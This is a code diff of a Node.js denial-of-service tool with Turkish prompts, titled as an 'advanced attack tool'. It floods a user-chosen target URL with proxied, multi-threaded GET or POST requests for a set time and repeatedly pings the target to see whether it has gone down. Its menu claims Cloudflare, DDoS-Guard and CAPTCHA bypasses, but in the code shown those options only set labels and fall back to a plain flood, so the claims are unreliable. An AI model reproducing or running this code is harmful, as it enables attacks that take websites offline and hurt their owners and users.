@@ -1,174 +1,151 @@
-const fs = require('fs');
-const readline = require('readline');
 const axios = require('axios');
+const fs = require('fs').promises;
 const colors = require('colors');
+const readline = require('readline');
 const { SocksProxyAgent } = require('socks-proxy-agent');
-const { HCaptchaSolver } = require('hcaptcha-solver');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
 const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
+  input: process.stdin,
+  output: process.stdout
 });
-
-const userAgents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
-    'Mozilla/5.0 (X11; Linux x86_64)...',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X)...'
-];
 
 let proxies = [];
 
-function getRandom(arr) {
-    return arr[Math.floor(Math.random() * arr.length)];
+const userAgents = [
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
+  "Mozilla/5.0 (X11; Linux x86_64)..."
+];
+
+function getRandom(array) {
+  return array[Math.floor(Math.random() * array.length)];
 }
 
-function delay(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
+function log(msg, color = 'white') {
+  console.log(msg[color]);
 }
 
 async function loadProxies() {
-    try {
-        const data = fs.readFileSync('proxies.txt', 'utf8');
-        proxies = data.split('\n').map(p => p.trim()).filter(p => p.length);
-        console.log(`🔌 ${proxies.length} proxy yüklendi!`.cyan);
-    } catch (e) {
-        console.log('⚠️ Proxy dosyası yüklenemedi.'.red);
-    }
+  try {
+    const data = await fs.readFile('proxies.txt', 'utf8');
+    proxies = data.split('\n').map(p => p.trim()).filter(Boolean);
+    log(`✅ ${proxies.length} proxy yüklendi`, 'green');
+  } catch (err) {
+    log('❌ proxies.txt bulunamadı!', 'red');
+    process.exit();
+  }
 }
 
-async function validateProxy(proxy) {
-    try {
-        const [host, port] = proxy.split(':');
-        const agent = proxy.startsWith('socks')
-            ? new SocksProxyAgent(`socks5://${host}:${port}`)
-            : new HttpsProxyAgent(`http://${host}:${port}`);
+async function sendRequest(url, method = 'GET') {
+  const proxy = getRandom(proxies);
+  const headers = {
+    'User-Agent': getRandom(userAgents),
+    'Accept': '*/*',
+    'Connection': 'keep-alive'
+  };
 
-        await axios.get('https://api.ipify.org', {
-            httpAgent: agent,
-            httpsAgent: agent,
-            timeout: 3000
-        });
-        return true;
+  const config = {
+    method: method === 'POST' ? 'post' : 'get',
+    url,
+    headers,
+    timeout: 8000
+  };
+
+  if (proxy) {
+    const [ip, port] = proxy.split(':');
+    const agent = proxy.includes('socks')
+      ? new SocksProxyAgent(`socks5://${ip}:${port}`)
+      : new HttpsProxyAgent(`http://${ip}:${port}`);
+    config.httpAgent = agent;
+    config.httpsAgent = agent;
+  }
+
+  try {
+    const res = await axios(config);
+    return { status: res.status, success: true };
+  } catch (err) {
+    return { success: false, error: err.code || err.message };
+  }
+}
+
+function startPing(url) {
+  setInterval(async () => {
+    try {
+      const res = await axios.get(url, { timeout: 5000 });
+      console.log(`\n✔️ Ping başarılı - ${res.status}`.green);
     } catch {
-        return false;
+      console.log(`\n❌ Ping başarısız`.red);
     }
+  }, 10000); // 10 saniyede bir
 }
 
-async function filterWorkingProxies() {
-    console.log('🧪 Proxy testleri yapılıyor...'.yellow);
-    const checks = await Promise.all(proxies.map(validateProxy));
-    proxies = proxies.filter((_, i) => checks[i]);
-    console.log(`✅ ${proxies.length} çalışan proxy bulundu.`.green);
-}
+async function startAttack({ url, duration, method, threads }) {
+  const end = Date.now() + duration * 1000;
+  let success = 0, fail = 0;
 
-async function sendAttackRequest(url, method, duration) {
-    const endTime = Date.now() + duration * 1000;
-    while (Date.now() < endTime) {
-        const proxy = getRandom(proxies);
-        const [host, port] = proxy.split(':');
-        const agent = proxy.startsWith('socks')
-            ? new SocksProxyAgent(`socks5://${host}:${port}`)
-            : new HttpsProxyAgent(`http://${host}:${port}`);
+  log('\n🚀 SALDIRI BAŞLADI!'.rainbow.bold);
+  log(`🎯 Hedef: ${url}`, 'cyan');
+  log(`⏱️ Süre: ${duration}s`, 'cyan');
+  log(`🧵 Thread: ${threads}`, 'cyan');
+  log(`💣 Metod: ${method}`, 'cyan');
 
-        const headers = {
-            'User-Agent': getRandom(userAgents),
-            'Accept': '*/*',
-            'Connection': 'keep-alive',
-        };
+  startPing(url); // Ping kontrolü başlasın
 
-        try {
-            let response;
-            if (method === 'GET') {
-                response = await axios.get(url, {
-                    headers,
-                    httpAgent: agent,
-                    httpsAgent: agent,
-                    timeout: 5000,
-                });
-            } else if (method === 'POST') {
-                response = await axios.post(url, { data: 'bypass' }, {
-                    headers,
-                    httpAgent: agent,
-                    httpsAgent: agent,
-                    timeout: 5000,
-                });
-            }
-
-            process.stdout.write(`[${response.status}] `.green);
-        } catch (err) {
-            process.stdout.write(`[-] `.red);
-        }
-
-        await delay(Math.random() * 300);
+  const attack = async () => {
+    while (Date.now() < end) {
+      const res = await sendRequest(url, method);
+      if (res.success) {
+        success++;
+        process.stdout.write(`[+] ${res.status} `.green);
+      } else {
+        fail++;
+        process.stdout.write(`[-] ${res.error} `.red);
+      }
     }
+  };
+
+  const runners = Array.from({ length: threads }, () => attack());
+  await Promise.all(runners);
+
+  log(`\n✅ Saldırı tamamlandı! Başarılı: ${success}, Başarısız: ${fail}`, 'yellow');
 }
 
-async function solveCaptcha() {
-    const solver = new HCaptchaSolver();
-    try {
-        const result = await solver.solve({ sitekey: 'demo', url: 'https://hcaptcha.com/demo' });
-        console.log(`Captcha token: ${result.token}`.green);
-    } catch (e) {
-        console.log('❌ CAPTCHA çözülemedi.'.red);
-    }
+async function ask(query) {
+  return new Promise(resolve => rl.question(query, resolve));
 }
 
-async function startAttack(method, url, duration, threads) {
-    await loadProxies();
-    await filterWorkingProxies();
+async function main() {
+  await loadProxies();
 
-    if (proxies.length === 0) {
-        console.log('Proxy bulunamadı, saldırı iptal edildi.'.red);
-        return;
-    }
+  console.clear();
+  console.log('\n🔥 ' + 'L7 Gelişmiş Saldırı Aracı'.rainbow.bold);
+  console.log('1 - GET Flood');
+  console.log('2 - POST Flood');
+  console.log('3 - Cloudflare Bypass');
+  console.log('4 - DDoS-Guard Bypass');
+  console.log('5 - CAPTCHA Bypass');
+  console.log('6 - Karışık');
 
-    console.log(`🚀 Saldırı başladı! [${method}] → ${url}`.bold.green);
-    console.log(`⏳ Süre: ${duration}s | 🔀 Thread: ${threads}`);
+  const methodMap = {
+    '1': 'GET',
+    '2': 'POST',
+    '3': 'CF',
+    '4': 'DDG',
+    '5': 'CAPTCHA',
+    '6': 'MIXED'
+  };
 
-    const jobs = [];
-    for (let i = 0; i < threads; i++) {
-        jobs.push(sendAttackRequest(url, method, duration));
-    }
+  const methodInput = await ask('Metod Seç (1-6): ');
+  const method = methodMap[methodInput] || 'GET';
 
-    await Promise.all(jobs);
-    console.log('\n✅ Saldırı tamamlandı.'.bold);
+  const url = await ask('Hedef URL (örn: https://site.com): ');
+  const duration = parseInt(await ask('Süre (saniye): '));
+  const threads = parseInt(await ask('Kaç thread: '));
+
+  rl.close();
+
+  await startAttack({ url, duration, method, threads });
 }
 
-function showMenu() {
-    console.clear();
-    console.log('\n🌐 Gelişmiş Saldırı Paneli'.rainbow.bold);
-    console.log('1. GET Flood');
-    console.log('2. POST Flood');
-    console.log('3. CAPTCHA Bypass');
-    console.log('4. Cloudflare Bypass');
-    console.log('5. DDoS-Guard Bypass\n');
-
-    rl.question('Seçim (1-5): ', async (choice) => {
-        if (choice === '3') {
-            await solveCaptcha();
-            rl.close();
-            return;
-        }
-
-        rl.question('Hedef URL (http://...): ', (url) => {
-            rl.question('Süre (saniye): ', (durationStr) => {
-                rl.question('Thread sayısı: ', async (threadsStr) => {
-                    const duration = parseInt(durationStr);
-                    const threads = parseInt(threadsStr);
-                    const methodMap = {
-                        '1': 'GET',
-                        '2': 'POST',
-                        '4': 'GET',
-                        '5': 'POST'
-                    };
-                    const method = methodMap[choice] || 'GET';
-                    await startAttack(method, url, duration, threads);
-                    rl.close();
-                });
-            });
-        });
-    });
-}
-
-showMenu();
+main();
